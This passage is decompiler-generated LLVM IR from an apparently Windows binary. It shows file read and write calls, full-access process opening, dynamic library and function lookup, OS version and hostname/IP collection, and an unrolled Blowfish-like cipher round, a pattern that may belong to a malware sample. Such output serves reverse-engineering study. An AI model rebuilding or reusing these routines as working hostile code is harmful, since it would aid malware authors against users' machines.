dec_label_pc_405fc7:                              ; preds = %dec_label_pc_405fc0
  %90 = ptrtoint i32* %stack_var_-163 to i32, !insn.addr !316
  %91 = sub i32 %87, %90, !insn.addr !317
  %92 = bitcast i8* %stack_var_-164 to i32*, !insn.addr !318
  %93 = call i1 @WriteFile(i32* %29, i32* nonnull %92, i32 %91, i32* nonnull %stack_var_-344, %_OVERLAPPED* null), !insn.addr !318
  %94 = call i1 @CloseHandle(i32* %29), !insn.addr !319
  %95 = call i32 @"@__security_check_cookie@4"(), !insn.addr !320
  ret i32 %95, !insn.addr !321

dec_label_pc_405fff:                              ; preds = %dec_label_pc_405e6a
  %96 = bitcast i8* %stack_var_-164 to i32*, !insn.addr !322
  %97 = call i1 @ReadFile(i32* %25, i32* nonnull %96, i32 40, i32* nonnull %stack_var_-344, %_OVERLAPPED* null), !insn.addr !322
  %98 = call i1 @CloseHandle(i32* %25), !insn.addr !323
  %99 = call i32 @"@__security_check_cookie@4"(), !insn.addr !324
  ret i32 %99, !insn.addr !325
}

define i32 @function_406040() local_unnamed_addr {
dec_label_pc_406040:
  %0 = call i128 @__decompiler_undefined_function_2()
  %1 = call i128 @__decompiler_undefined_function_2()
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !326
  call void @__asm_movdqu.10(i128 %1, i128 %2), !insn.addr !327
  %3 = call i32* @GetModuleHandleA(i8* null), !insn.addr !328
  %4 = load i128, i128* @global_var_425fd0, align 4, !insn.addr !329
  %5 = call i128 @__asm_movdqa(i128 %4), !insn.addr !329
  call void @__asm_movdqu.10(i128 0, i128 %5), !insn.addr !330
  %6 = call i32 @function_406f10(), !insn.addr !331
  %7 = call i32 @"@__security_check_cookie@4"(), !insn.addr !332
  ret i32 %7, !insn.addr !333
}

define i32 @function_4060c0() local_unnamed_addr {
dec_label_pc_4060c0:
  %eax.1.reg2mem = alloca i32, !insn.addr !334
  %ecx.0.reg2mem = alloca i32, !insn.addr !334
  %0 = call i128 @__decompiler_undefined_function_2()
  %stack_var_-229 = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i128 @__decompiler_undefined_function_2()
  %stack_var_-227 = alloca i32, align 4
  %3 = call i32* @_memset(i32* nonnull %stack_var_-227, i32 0, i32 199), !insn.addr !335
  %4 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !336
  call void @__asm_movdqu.10(i128 %2, i128 %4), !insn.addr !337
  %5 = call i32 @function_406f10(), !insn.addr !338
  %6 = call i32 @GetCurrentProcessId(), !insn.addr !339
  %7 = call i32* @OpenProcess(i32 2097151, i1 false, i32 %6), !insn.addr !340
  %8 = call i32* @GetModuleHandleA(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_425a34, i32 0, i32 0)), !insn.addr !341
  %9 = call i128 @__asm_movdqa(i128 146741680557342705658657612803137171535), !insn.addr !342
  call void @__asm_movdqu.10(i128 71, i128 %9), !insn.addr !343
  %10 = call i32 @function_406f10(), !insn.addr !344
  %11 = call i128 @__asm_movdqa(i128 154696320155462111533670083339618641223), !insn.addr !345
  call void @__asm_movdqu.10(i128 71, i128 %11), !insn.addr !346
  %12 = call i32 @function_406f10(), !insn.addr !347
  %13 = icmp eq i32 %1, 0, !insn.addr !348
  br i1 %13, label %dec_label_pc_4061f8, label %dec_label_pc_4061eb, !insn.addr !349

dec_label_pc_4061eb:                              ; preds = %dec_label_pc_4060c0
  %14 = call i32 (i8*, ...) @_printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_425a44, i32 0, i32 0)), !insn.addr !350
  br label %dec_label_pc_4061f8, !insn.addr !351

dec_label_pc_4061f8:                              ; preds = %dec_label_pc_4061eb, %dec_label_pc_4060c0
  %15 = call i32* @LoadLibraryW(i16* getelementptr inbounds ([12 x i16], [12 x i16]* @global_var_425a48, i32 0, i32 0)), !insn.addr !352
  %16 = call i32* @GetModuleHandleW(i16* getelementptr inbounds ([12 x i16], [12 x i16]* @global_var_425a48, i32 0, i32 0)), !insn.addr !353
  %17 = call i32 @function_406f10(), !insn.addr !354
  %18 = icmp eq i32 %17, 0, !insn.addr !355
  br i1 %18, label %dec_label_pc_40626e, label %dec_label_pc_406239, !insn.addr !356

dec_label_pc_406239:                              ; preds = %dec_label_pc_4061f8
  %19 = call i32 (i8*, ...) @_printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_425a60, i32 0, i32 0)), !insn.addr !357
  %20 = ptrtoint i32* %stack_var_-229 to i32, !insn.addr !358
  store i32 %20, i32* %ecx.0.reg2mem, !insn.addr !358
  br label %dec_label_pc_406250, !insn.addr !358

dec_label_pc_406250:                              ; preds = %dec_label_pc_406250, %dec_label_pc_406239
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %21 = add i32 %ecx.0.reload, 1, !insn.addr !359
  %22 = inttoptr i32 %21 to i8*, !insn.addr !359
  %23 = load i8, i8* %22, align 1, !insn.addr !359
  %24 = icmp eq i8 %23, 0, !insn.addr !360
  %25 = icmp eq i1 %24, false, !insn.addr !361
  store i32 %21, i32* %ecx.0.reg2mem, !insn.addr !361
  br i1 %25, label %dec_label_pc_406250, label %dec_label_pc_40625a, !insn.addr !361

dec_label_pc_40625a:                              ; preds = %dec_label_pc_406250
  %26 = call i32 @"@__security_check_cookie@4"(), !insn.addr !362
  ret i32 %26, !insn.addr !363

dec_label_pc_40626e:                              ; preds = %dec_label_pc_4061f8
  %27 = ptrtoint i32* %stack_var_-229 to i32, !insn.addr !364
  store i32 %27, i32* %eax.1.reg2mem, !insn.addr !364
  br label %dec_label_pc_406275, !insn.addr !364

dec_label_pc_406275:                              ; preds = %dec_label_pc_406275, %dec_label_pc_40626e
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %28 = add i32 %eax.1.reload, 1, !insn.addr !365
  %29 = inttoptr i32 %28 to i8*, !insn.addr !365
  %30 = load i8, i8* %29, align 1, !insn.addr !365
  %31 = icmp eq i8 %30, 0, !insn.addr !366
  %32 = icmp eq i1 %31, false, !insn.addr !367
  store i32 %28, i32* %eax.1.reg2mem, !insn.addr !367
  br i1 %32, label %dec_label_pc_406275, label %dec_label_pc_40627f, !insn.addr !367

dec_label_pc_40627f:                              ; preds = %dec_label_pc_406275
  %33 = call i32 @"@__security_check_cookie@4"(), !insn.addr !368
  ret i32 %33, !insn.addr !369
}

define i32 @function_4062a0() local_unnamed_addr {
dec_label_pc_4062a0:
  %edi.2.reg2mem = alloca i32, !insn.addr !370
  %edx.1.reg2mem = alloca i32, !insn.addr !370
  %edi.1.reg2mem = alloca i32, !insn.addr !370
  %edi.0.reg2mem = alloca i32, !insn.addr !370
  %edx.0.reg2mem = alloca i32, !insn.addr !370
  %0 = call i128 @__decompiler_undefined_function_2()
  %1 = call i1 @__decompiler_undefined_function_3()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-57 = alloca i32, align 4
  %3 = call i128 @__decompiler_undefined_function_2()
  %stack_var_-36 = alloca i8, align 1
  %stack_var_-16 = alloca i32*, align 4
  %4 = call i128 @__decompiler_undefined_function_2()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %6 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !371
  call void @__asm_movdqu.10(i128 %4, i128 %6), !insn.addr !372
  store i32* null, i32** %stack_var_-16, align 4, !insn.addr !373
  %7 = call i32* @_memset(i32* null, i32 0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !374
  store i32 276, i32* %stack_var_-332, align 4, !insn.addr !375
  %8 = call i128 @__asm_xorps(i128 %6, i128 %6), !insn.addr !376
  call void @__asm_movdqu.10(i128 %3, i128 %8), !insn.addr !377
  %9 = call i32* @GetModuleHandleA(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_4259fc, i32 0, i32 0)), !insn.addr !378
  store i8 71, i8* %stack_var_-36, align 1, !insn.addr !379
  %10 = call i32 ()* @GetProcAddress(i32* %9, i8* nonnull %stack_var_-36), !insn.addr !380
  %11 = bitcast i32* %stack_var_-332 to %_OSVERSIONINFOW*
  %12 = call i1 @GetVersionExW(%_OSVERSIONINFOW* nonnull %11), !insn.addr !381
  %13 = bitcast i32** %stack_var_-16 to i8*
  %14 = call i8* @__itoa(i32 %5, i8* nonnull %13, i32 10), !insn.addr !382
  %15 = ptrtoint i32** %stack_var_-16 to i32, !insn.addr !383
  store i32 %15, i32* %edx.0.reg2mem, !insn.addr !384
  br label %dec_label_pc_406364, !insn.addr !384

dec_label_pc_406364:                              ; preds = %dec_label_pc_406364, %dec_label_pc_4062a0
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %16 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !385
  %17 = load i8, i8* %16, align 1, !insn.addr !385
  %18 = add i32 %edx.0.reload, 1, !insn.addr !386
  %19 = icmp eq i8 %17, 0, !insn.addr !387
  %20 = icmp eq i1 %19, false, !insn.addr !388
  store i32 %18, i32* %edx.0.reg2mem, !insn.addr !388
  br i1 %20, label %dec_label_pc_406364, label %dec_label_pc_40636b, !insn.addr !388

dec_label_pc_40636b:                              ; preds = %dec_label_pc_406364
  %21 = ptrtoint i32* %stack_var_-57 to i32, !insn.addr !389
  store i32 %21, i32* %edi.0.reg2mem, !insn.addr !389
  br label %dec_label_pc_406371, !insn.addr !389

dec_label_pc_406371:                              ; preds = %dec_label_pc_406371, %dec_label_pc_40636b
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %22 = add i32 %edi.0.reload, 1, !insn.addr !390
  %23 = inttoptr i32 %22 to i8*
  %24 = load i8, i8* %23, align 1, !insn.addr !390
  %25 = icmp eq i8 %24, 0, !insn.addr !391
  %26 = icmp eq i1 %25, false, !insn.addr !392
  store i32 %22, i32* %edi.0.reg2mem, !insn.addr !392
  br i1 %26, label %dec_label_pc_406371, label %dec_label_pc_406379, !insn.addr !392

dec_label_pc_406379:                              ; preds = %dec_label_pc_406371
  %27 = sub i32 %18, %15, !insn.addr !393
  %28 = udiv i32 %27, 4, !insn.addr !394
  call void @__asm_rep_movsd_memcpy(i8* %23, i8* nonnull %13, i32 %28), !insn.addr !395
  %29 = select i1 %1, i32 -4, i32 4, !insn.addr !395
  %30 = mul i32 %28, %29, !insn.addr !395
  %31 = add i32 %22, %30, !insn.addr !395
  %32 = and i32 %27, 3, !insn.addr !396
  %33 = inttoptr i32 %31 to i8*, !insn.addr !397
  call void @__asm_rep_movsb_memcpy(i8* %33, i8* %33, i32 %32), !insn.addr !397
  store i32 %21, i32* %edi.1.reg2mem, !insn.addr !398
  br label %dec_label_pc_406390, !insn.addr !398

dec_label_pc_406390:                              ; preds = %dec_label_pc_406390, %dec_label_pc_406379
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %34 = add i32 %edi.1.reload, 1, !insn.addr !399
  %35 = inttoptr i32 %34 to i8*, !insn.addr !399
  %36 = load i8, i8* %35, align 1, !insn.addr !399
  %37 = icmp eq i8 %36, 0, !insn.addr !400
  %38 = icmp eq i1 %37, false, !insn.addr !401
  store i32 %34, i32* %edi.1.reg2mem, !insn.addr !401
  br i1 %38, label %dec_label_pc_406390, label %dec_label_pc_40639a, !insn.addr !401

dec_label_pc_40639a:                              ; preds = %dec_label_pc_406390
  %39 = inttoptr i32 %34 to i32*, !insn.addr !402
  store i32 7760237, i32* %39, align 4, !insn.addr !402
  %40 = call i8* @__itoa(i32 %2, i8* nonnull %13, i32 10), !insn.addr !403
  store i32 %15, i32* %edx.1.reg2mem, !insn.addr !404
  br label %dec_label_pc_4063c0, !insn.addr !404

dec_label_pc_4063c0:                              ; preds = %dec_label_pc_4063c0, %dec_label_pc_40639a
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %41 = inttoptr i32 %edx.1.reload to i8*, !insn.addr !405
  %42 = load i8, i8* %41, align 1, !insn.addr !405
  %43 = add i32 %edx.1.reload, 1, !insn.addr !406
  %44 = icmp eq i8 %42, 0, !insn.addr !407
  %45 = icmp eq i1 %44, false, !insn.addr !408
  store i32 %43, i32* %edx.1.reg2mem, !insn.addr !408
  store i32 %21, i32* %edi.2.reg2mem, !insn.addr !408
  br i1 %45, label %dec_label_pc_4063c0, label %dec_label_pc_4063d0, !insn.addr !408

dec_label_pc_4063d0:                              ; preds = %dec_label_pc_4063c0, %dec_label_pc_4063d0
  %edi.2.reload = load i32, i32* %edi.2.reg2mem
  %46 = add i32 %edi.2.reload, 1, !insn.addr !409
  %47 = inttoptr i32 %46 to i8*
  %48 = load i8, i8* %47, align 1, !insn.addr !409
  %49 = icmp eq i8 %48, 0, !insn.addr !410
  %50 = icmp eq i1 %49, false, !insn.addr !411
  store i32 %46, i32* %edi.2.reg2mem, !insn.addr !411
  br i1 %50, label %dec_label_pc_4063d0, label %dec_label_pc_4063d8, !insn.addr !411

dec_label_pc_4063d8:                              ; preds = %dec_label_pc_4063d0
  %51 = sub i32 %43, %15, !insn.addr !412
  %52 = udiv i32 %51, 4, !insn.addr !413
  call void @__asm_rep_movsd_memcpy(i8* %47, i8* nonnull %13, i32 %52), !insn.addr !414
  %53 = mul i32 %52, %29, !insn.addr !414
  %54 = add i32 %46, %53, !insn.addr !414
  %55 = and i32 %51, 3, !insn.addr !415
  %56 = inttoptr i32 %54 to i8*, !insn.addr !416
  call void @__asm_rep_movsb_memcpy(i8* %56, i8* %56, i32 %55), !insn.addr !416
  %57 = call i32 @"@__security_check_cookie@4"(), !insn.addr !417
  ret i32 %57, !insn.addr !418
}

define i32 @function_406400() local_unnamed_addr {
dec_label_pc_406400:
  %stack_var_-88 = alloca i32, align 4
  %0 = bitcast i32* %stack_var_-88 to i8*
  %1 = call i32 @gethostname(i8* nonnull %0, i32 80), !insn.addr !419
  %2 = icmp eq i32 %1, -1, !insn.addr !420
  %3 = icmp eq i1 %2, false, !insn.addr !421
  br i1 %3, label %dec_label_pc_406434, label %dec_label_pc_406421, !insn.addr !421

dec_label_pc_406421:                              ; preds = %dec_label_pc_406434, %dec_label_pc_406400
  %4 = call i32 @"@__security_check_cookie@4"(), !insn.addr !422
  ret i32 %4, !insn.addr !423

dec_label_pc_406434:                              ; preds = %dec_label_pc_406400
  %5 = call %hostent* @gethostbyname(i8* nonnull %0), !insn.addr !424
  %6 = icmp eq %hostent* %5, null, !insn.addr !425
  br i1 %6, label %dec_label_pc_406421, label %dec_label_pc_406442, !insn.addr !426

dec_label_pc_406442:                              ; preds = %dec_label_pc_406434
  %7 = ptrtoint %hostent* %5 to i32, !insn.addr !424
  %8 = add i32 %7, 12, !insn.addr !427
  %9 = inttoptr i32 %8 to i32*, !insn.addr !427
  %10 = load i32, i32* %9, align 4, !insn.addr !427
  %11 = inttoptr i32 %10 to i32*, !insn.addr !428
  %12 = load i32, i32* %11, align 4, !insn.addr !428
  %13 = icmp eq i32 %12, 0, !insn.addr !429
  br i1 %13, label %dec_label_pc_406453, label %dec_label_pc_40644b, !insn.addr !430

dec_label_pc_40644b:                              ; preds = %dec_label_pc_406442
  %14 = inttoptr i32 %12 to i32*, !insn.addr !431
  %15 = load i32, i32* %14, align 4, !insn.addr !431
  %16 = insertvalue %in_addr undef, i32 %15, 0, !insn.addr !432
  %17 = call i8* @inet_ntoa(%in_addr %16), !insn.addr !432
  br label %dec_label_pc_406453, !insn.addr !432

dec_label_pc_406453:                              ; preds = %dec_label_pc_40644b, %dec_label_pc_406442
  %18 = call i32 @"@__security_check_cookie@4"(), !insn.addr !433
  ret i32 %18, !insn.addr !434
}

define i32 @function_406470(i32 %arg1) local_unnamed_addr {
dec_label_pc_406470:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = inttoptr i32 %0 to i8*, !insn.addr !435
  %3 = add i32 %1, 1, !insn.addr !436
  %4 = inttoptr i32 %3 to i8*, !insn.addr !436
  %5 = load i8, i8* %4, align 1, !insn.addr !436
  %6 = zext i8 %5 to i32, !insn.addr !436
  %7 = mul i32 %1, 256, !insn.addr !437
  %8 = and i32 %7, 65280, !insn.addr !438
  %9 = or i32 %8, %6, !insn.addr !439
  %10 = add i32 %1, 2, !insn.addr !440
  %11 = inttoptr i32 %10 to i8*, !insn.addr !440
  %12 = load i8, i8* %11, align 1, !insn.addr !440
  %13 = zext i8 %12 to i32, !insn.addr !440
  %14 = mul i32 %9, 256, !insn.addr !441
  %15 = or i32 %14, %13, !insn.addr !442
  %16 = add i32 %1, 3, !insn.addr !443
  %17 = inttoptr i32 %16 to i8*, !insn.addr !443
  %18 = load i8, i8* %17, align 1, !insn.addr !443
  %19 = zext i8 %18 to i32, !insn.addr !443
  %20 = mul i32 %15, 256, !insn.addr !444
  %21 = or i32 %20, %19, !insn.addr !445
  %22 = inttoptr i32 %arg1 to i32*, !insn.addr !446
  %23 = load i32, i32* %22, align 4, !insn.addr !446
  %24 = xor i32 %21, %23, !insn.addr !446
  %25 = udiv i32 %24, 16777216, !insn.addr !447
  %26 = udiv i32 %24, 16384
  %27 = and i32 %26, 1020, !insn.addr !448
  %28 = add i32 %arg1, 1096, !insn.addr !448
  %29 = add i32 %27, %28, !insn.addr !448
  %30 = inttoptr i32 %29 to i32*, !insn.addr !448
  %31 = load i32, i32* %30, align 4, !insn.addr !448
  %32 = mul i32 %25, 4, !insn.addr !449
  %33 = add i32 %arg1, 72, !insn.addr !449
  %34 = add i32 %32, %33, !insn.addr !449
  %35 = inttoptr i32 %34 to i32*, !insn.addr !449
  %36 = load i32, i32* %35, align 4, !insn.addr !449
  %37 = add i32 %36, %31, !insn.addr !449
  %38 = add i32 %1, 4, !insn.addr !450
  %39 = inttoptr i32 %38 to i8*, !insn.addr !450
  %40 = load i8, i8* %39, align 1, !insn.addr !450
  %41 = zext i8 %40 to i32, !insn.addr !450
  %42 = mul i32 %41, 256, !insn.addr !451
  %43 = udiv i32 %24, 64
  %44 = and i32 %43, 1020, !insn.addr !452
  %45 = add i32 %arg1, 2120, !insn.addr !452
  %46 = add i32 %44, %45, !insn.addr !452
  %47 = inttoptr i32 %46 to i32*, !insn.addr !452
  %48 = load i32, i32* %47, align 4, !insn.addr !452
  %49 = xor i32 %48, %37, !insn.addr !452
  %50 = mul i32 %24, 4, !insn.addr !453
  %51 = and i32 %50, 1020, !insn.addr !454
  %52 = add i32 %arg1, 3144, !insn.addr !454
  %53 = add i32 %51, %52, !insn.addr !454
  %54 = inttoptr i32 %53 to i32*, !insn.addr !454
  %55 = load i32, i32* %54, align 4, !insn.addr !454
  %56 = add i32 %49, %55, !insn.addr !454
  %57 = add i32 %1, 5, !insn.addr !455
  %58 = inttoptr i32 %57 to i8*, !insn.addr !455
  %59 = load i8, i8* %58, align 1, !insn.addr !455
  %60 = zext i8 %59 to i32, !insn.addr !455
  %61 = or i32 %42, %60, !insn.addr !456
  %62 = add i32 %1, 6, !insn.addr !457
  %63 = inttoptr i32 %62 to i8*, !insn.addr !457
  %64 = load i8, i8* %63, align 1, !insn.addr !457
  %65 = zext i8 %64 to i32, !insn.addr !457
  %66 = mul i32 %61, 256, !insn.addr !458
  %67 = or i32 %66, %65, !insn.addr !459
  %68 = add i32 %1, 7, !insn.addr !460
  %69 = inttoptr i32 %68 to i8*, !insn.addr !460
  %70 = load i8, i8* %69, align 1, !insn.addr !460
  %71 = zext i8 %70 to i32, !insn.addr !460
  %72 = mul i32 %67, 256, !insn.addr !461
  %73 = or i32 %72, %71, !insn.addr !462
  %74 = add i32 %arg1, 4, !insn.addr !463
  %75 = inttoptr i32 %74 to i32*, !insn.addr !463
  %76 = load i32, i32* %75, align 4, !insn.addr !463
  %77 = xor i32 %76, %56, !insn.addr !464
  %78 = xor i32 %77, %73, !insn.addr !463
  %79 = udiv i32 %78, 16777216, !insn.addr !465
  %80 = udiv i32 %78, 16384
  %81 = and i32 %80, 1020, !insn.addr !466
  %82 = add i32 %81, %28, !insn.addr !466
  %83 = inttoptr i32 %82 to i32*, !insn.addr !466
  %84 = load i32, i32* %83, align 4, !insn.addr !466
  %85 = mul i32 %79, 4, !insn.addr !467
  %86 = add i32 %85, %33, !insn.addr !467
  %87 = inttoptr i32 %86 to i32*, !insn.addr !467
  %88 = load i32, i32* %87, align 4, !insn.addr !467
  %89 = add i32 %88, %84, !insn.addr !467
  %90 = udiv i32 %78, 64
  %91 = and i32 %90, 1020, !insn.addr !468
  %92 = add i32 %91, %45, !insn.addr !468
  %93 = inttoptr i32 %92 to i32*, !insn.addr !468
  %94 = load i32, i32* %93, align 4, !insn.addr !468
  %95 = xor i32 %89, %94, !insn.addr !468
  %96 = mul i32 %78, 4, !insn.addr !469
  %97 = and i32 %96, 1020, !insn.addr !470
  %98 = add i32 %97, %52, !insn.addr !470
  %99 = inttoptr i32 %98 to i32*, !insn.addr !470
  %100 = load i32, i32* %99, align 4, !insn.addr !470
  %101 = add i32 %95, %100, !insn.addr !470
  %102 = xor i32 %101, %24, !insn.addr !471
  %103 = add i32 %arg1, 8, !insn.addr !472
  %104 = inttoptr i32 %103 to i32*, !insn.addr !472
  %105 = load i32, i32* %104, align 4, !insn.addr !472
  %106 = xor i32 %102, %105, !insn.addr !473
  %107 = udiv i32 %106, 16777216, !insn.addr !474
  %108 = udiv i32 %106, 16384
  %109 = and i32 %108, 1020, !insn.addr !475
  %110 = add i32 %109, %28, !insn.addr !475
  %111 = inttoptr i32 %110 to i32*, !insn.addr !475
  %112 = load i32, i32* %111, align 4, !insn.addr !475
  %113 = mul i32 %107, 4, !insn.addr !476
  %114 = add i32 %113, %33, !insn.addr !476
  %115 = inttoptr i32 %114 to i32*, !insn.addr !476
  %116 = load i32, i32* %115, align 4, !insn.addr !476
  %117 = add i32 %116, %112, !insn.addr !476
  %118 = udiv i32 %106, 64
  %119 = and i32 %118, 1020, !insn.addr !477
  %120 = add i32 %119, %45, !insn.addr !477
  %121 = inttoptr i32 %120 to i32*, !insn.addr !477
  %122 = load i32, i32* %121, align 4, !insn.addr !477
  %123 = xor i32 %117, %122, !insn.addr !477
  %124 = mul i32 %106, 4, !insn.addr !478
  %125 = and i32 %124, 1020, !insn.addr !479
  %126 = add i32 %125, %52, !insn.addr !479
  %127 = inttoptr i32 %126 to i32*, !insn.addr !479
  %128 = load i32, i32* %127, align 4, !insn.addr !479
  %129 = add i32 %123, %128, !insn.addr !479
  %130 = xor i32 %129, %78, !insn.addr !480
  %131 = add i32 %arg1, 12, !insn.addr !481
  %132 = inttoptr i32 %131 to i32*, !insn.addr !481
  %133 = load i32, i32* %132, align 4, !insn.addr !481
  %134 = xor i32 %130, %133, !insn.addr !482
  %135 = udiv i32 %134, 16777216, !insn.addr !483
  %136 = udiv i32 %134, 16384
  %137 = and i32 %136, 1020, !insn.addr !484
  %138 = add i32 %137, %28, !insn.addr !484
  %139 = inttoptr i32 %138 to i32*, !insn.addr !484
  %140 = load i32, i32* %139, align 4, !insn.addr !484
  %141 = mul i32 %135, 4, !insn.addr !485
  %142 = add i32 %141, %33, !insn.addr !485
  %143 = inttoptr i32 %142 to i32*, !insn.addr !485
  %144 = load i32, i32* %143, align 4, !insn.addr !485
  %145 = add i32 %144, %140, !insn.addr !485
  %146 = udiv i32 %134, 64
  %147 = and i32 %146, 1020, !insn.addr !486
  %148 = add i32 %147, %45, !insn.addr !486
  %149 = inttoptr i32 %148 to i32*, !insn.addr !486
  %150 = load i32, i32* %149, align 4, !insn.addr !486
  %151 = xor i32 %145, %150, !insn.addr !486
  %152 = mul i32 %134, 4, !insn.addr !487
  %153 = and i32 %152, 1020, !insn.addr !488
  %154 = add i32 %153, %52, !insn.addr !488
  %155 = inttoptr i32 %154 to i32*, !insn.addr !488
  %156 = load i32, i32* %155, align 4, !insn.addr !488
  %157 = add i32 %151, %156, !insn.addr !488
  %158 = xor i32 %157, %106, !insn.addr !489
  %159 = add i32 %arg1, 16, !insn.addr !490
  %160 = inttoptr i32 %159 to i32*, !insn.addr !490
  %161 = load i32, i32* %160, align 4, !insn.addr !490
  %162 = xor i32 %158, %161, !insn.addr !491
  %163 = udiv i32 %162, 16777216, !insn.addr !492
  %164 = udiv i32 %162, 16384
  %165 = and i32 %164, 1020, !insn.addr !493
  %166 = add i32 %165, %28, !insn.addr !493
  %167 = inttoptr i32 %166 to i32*, !insn.addr !493
  %168 = load i32, i32* %167, align 4, !insn.addr !493
  %169 = mul i32 %163, 4, !insn.addr !494
  %170 = add i32 %169, %33, !insn.addr !494
  %171 = inttoptr i32 %170 to i32*, !insn.addr !494
  %172 = load i32, i32* %171, align 4, !insn.addr !494
  %173 = add i32 %172, %168, !insn.addr !494
  %174 = udiv i32 %162, 64
  %175 = and i32 %174, 1020, !insn.addr !495
  %176 = add i32 %175, %45, !insn.addr !495
  %177 = inttoptr i32 %176 to i32*, !insn.addr !495
  %178 = load i32, i32* %177, align 4, !insn.addr !495
  %179 = xor i32 %173, %178, !insn.addr !495
  %180 = mul i32 %162, 4, !insn.addr !496
  %181 = and i32 %180, 1020, !insn.addr !497
  %182 = add i32 %181, %52, !insn.addr !497
  %183 = inttoptr i32 %182 to i32*, !insn.addr !497
  %184 = load i32, i32* %183, align 4, !insn.addr !497
  %185 = add i32 %179, %184, !insn.addr !497
  %186 = xor i32 %185, %134, !insn.addr !498
  %187 = add i32 %arg1, 20, !insn.addr !499
  %188 = inttoptr i32 %187 to i32*, !insn.addr !499
  %189 = load i32, i32* %188, align 4, !insn.addr !499
  %190 = xor i32 %186, %189, !insn.addr !500
  %191 = udiv i32 %190, 16777216, !insn.addr !501
  %192 = udiv i32 %190, 16384
  %193 = and i32 %192, 1020, !insn.addr !502
  %194 = add i32 %193, %28, !insn.addr !502
  %195 = inttoptr i32 %194 to i32*, !insn.addr !502
  %196 = load i32, i32* %195, align 4, !insn.addr !502
  %197 = mul i32 %191, 4, !insn.addr !503
  %198 = add i32 %197, %33, !insn.addr !503
  %199 = inttoptr i32 %198 to i32*, !insn.addr !503
  %200 = load i32, i32* %199, align 4, !insn.addr !503
  %201 = add i32 %200, %196, !insn.addr !503
  %202 = udiv i32 %190, 64
  %203 = and i32 %202, 1020, !insn.addr !504
  %204 = add i32 %203, %45, !insn.addr !504
  %205 = inttoptr i32 %204 to i32*, !insn.addr !504
  %206 = load i32, i32* %205, align 4, !insn.addr !504
  %207 = xor i32 %201, %206, !insn.addr !504
  %208 = mul i32 %190, 4, !insn.addr !505
  %209 = and i32 %208, 1020, !insn.addr !506
  %210 = add i32 %209, %52, !insn.addr !506
  %211 = inttoptr i32 %210 to i32*, !insn.addr !506
  %212 = load i32, i32* %211, align 4, !insn.addr !506
  %213 = add i32 %207, %212, !insn.addr !506
  %214 = xor i32 %213, %162, !insn.addr !507
  %215 = add i32 %arg1, 24, !insn.addr !508
  %216 = inttoptr i32 %215 to i32*, !insn.addr !508
  %217 = load i32, i32* %216, align 4, !insn.addr !508
  %218 = xor i32 %214, %217, !insn.addr !509
  %219 = udiv i32 %218, 16777216, !insn.addr !510
  %220 = udiv i32 %218, 16384
  %221 = and i32 %220, 1020, !insn.addr !511
  %222 = add i32 %221, %28, !insn.addr !511
  %223 = inttoptr i32 %222 to i32*, !insn.addr !511
  %224 = load i32, i32* %223, align 4, !insn.addr !511
  %225 = mul i32 %219, 4, !insn.addr !512
  %226 = add i32 %225, %33, !insn.addr !512
  %227 = inttoptr i32 %226 to i32*, !insn.addr !512
  %228 = load i32, i32* %227, align 4, !insn.addr !512
  %229 = add i32 %228, %224, !insn.addr !512
  %230 = udiv i32 %218, 64
  %231 = and i32 %230, 1020, !insn.addr !513
  %232 = add i32 %231, %45, !insn.addr !513
  %233 = inttoptr i32 %232 to i32*, !insn.addr !513
  %234 = load i32, i32* %233, align 4, !insn.addr !513
  %235 = xor i32 %229, %234, !insn.addr !513
  %236 = mul i32 %218, 4, !insn.addr !514
  %237 = and i32 %236, 1020, !insn.addr !515
  %238 = add i32 %237, %52, !insn.addr !515
  %239 = inttoptr i32 %238 to i32*, !insn.addr !515
  %240 = load i32, i32* %239, align 4, !insn.addr !515
  %241 = add i32 %235, %240, !insn.addr !515
  %242 = xor i32 %241, %190, !insn.addr !516
  %243 = add i32 %arg1, 28, !insn.addr !517
  %244 = inttoptr i32 %243 to i32*, !insn.addr !517
  %245 = load i32, i32* %244, align 4, !insn.addr !517
  %246 = xor i32 %242, %245, !insn.addr !518
  %247 = udiv i32 %246, 16777216, !insn.addr !519
  %248 = udiv i32 %246, 16384
  %249 = and i32 %248, 1020, !insn.addr !520
  %250 = add i32 %249, %28, !insn.addr !520
  %251 = inttoptr i32 %250 to i32*, !insn.addr !520
  %252 = load i32, i32* %251, align 4, !insn.addr !520
  %253 = mul i32 %247, 4, !insn.addr !521
  %254 = add i32 %253, %33, !insn.addr !521
  %255 = inttoptr i32 %254 to i32*, !insn.addr !521
  %256 = load i32, i32* %255, align 4, !insn.addr !521
  %257 = add i32 %256, %252, !insn.addr !521
  %258 = udiv i32 %246, 64
  %259 = and i32 %258, 1020, !insn.addr !522
  %260 = add i32 %259, %45, !insn.addr !522
  %261 = inttoptr i32 %260 to i32*, !insn.addr !522
  %262 = load i32, i32* %261, align 4, !insn.addr !522
  %263 = xor i32 %257, %262, !insn.addr !522
  %264 = mul i32 %246, 4, !insn.addr !523
  %265 = and i32 %264, 1020, !insn.addr !524
  %266 = add i32 %265, %52, !insn.addr !524
  %267 = inttoptr i32 %266 to i32*, !insn.addr !524
  %268 = load i32, i32* %267, align 4, !insn.addr !524
  %269 = add i32 %263, %268, !insn.addr !524
  %270 = xor i32 %269, %218, !insn.addr !525
  %271 = add i32 %arg1, 32, !insn.addr !526
  %272 = inttoptr i32 %271 to i32*, !insn.addr !526
  %273 = load i32, i32* %272, align 4, !insn.addr !526
